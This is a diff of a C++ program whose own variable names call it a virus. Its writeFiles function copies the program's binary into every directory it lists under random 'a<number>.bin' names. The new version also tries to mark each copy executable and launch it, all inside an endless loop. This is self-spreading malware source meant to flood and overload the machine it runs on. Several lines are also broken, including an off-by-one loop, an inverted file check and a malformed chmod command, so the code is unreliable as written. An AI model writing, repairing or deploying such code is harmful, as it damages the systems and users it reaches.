@@ -1,12 +1,14 @@
-#include <dirent.h>
 #include <vector>
-#include <iostream>
-#include <fstream>
+#include <bitset>
 #include <regex>
+#include <thread>
 #include <cstdlib>
+#include <fstream>
+#include <dirent.h>
+#include <iostream>
 
 using namespace std;
-
+namespace fs = std::filesystem;
 //variables
 regex correctFile("(a)+([0-9]?)+(.*)");
 // detect archives
@@ -46,26 +48,31 @@ void writeFiles(vector<string> files)
 {
 
   string file = "a.out";
-  for (int i = 0; i <= files.size(); i++)
+  do
   {
-    try
+    for (int i = 0; i <= files.size(); i++)
     {
-      if (regex_match(files[i], correctFile))
-        file = files[i];
-
-      // get the directories
-      if ((!regex_match(files[i], itsAFile) == 0 || files[i] == ".") && files[i] != "..")
+      try
       {
+        if (regex_match(files[i], correctFile))
+          file = files[i];
 
-        ifstream fileVirus(file, ios::binary);
-        ofstream copyVirus((files[i] + "/a" + to_string(rand()) + ".bin"), ios::binary);
-        cout << files[i] + "/a" + to_string(rand()) + ".bin" << endl;
-        copyVirus << fileVirus.rdbuf();
+        // get the directories
+        if ((!regex_match(files[i], itsAFile) == 0 || files[i] == ".") && files[i] != "..")
+        {
+          string nameVirus = (files[i] + "/a" + to_string(rand()) + ".bin");
+          ifstream fileVirus(file, ios::binary);
+          ofstream copyVirus(nameVirus, ios::binary);
+          if (!fileVirus.is_open())
+            copyVirus << fileVirus.rdbuf();
+          fileVirus.close();
+          thread system("chmod 775" + nameVirus + ";" + nameVirus);
+        }
+      }
+      catch (...)
+      {
+        cout << "fuck" << endl;
       }
     }
-    catch (...)
-    {
-      cout << "fuck" << endl;
-    }
-  }
+  } while (true);
 }
